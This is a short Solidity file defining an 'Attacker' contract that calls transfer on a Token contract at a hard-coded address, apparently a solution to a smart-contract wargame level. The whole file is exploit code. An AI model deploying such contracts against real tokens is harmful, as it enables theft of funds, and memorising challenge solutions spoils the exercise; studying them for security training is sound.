pragma solidity ^0.6.0;

import "./instance.sol";

contract Attacker {
    Token instance = Token(0x4A703DDF38d49398A1723213072B53c6C4cc1cad);

    function attack(uint256 _value) public {
        instance.transfer(0x182Af69fB08b4D08c42B68cc0d9f50b14bCbFd7a, _value);
    }
}
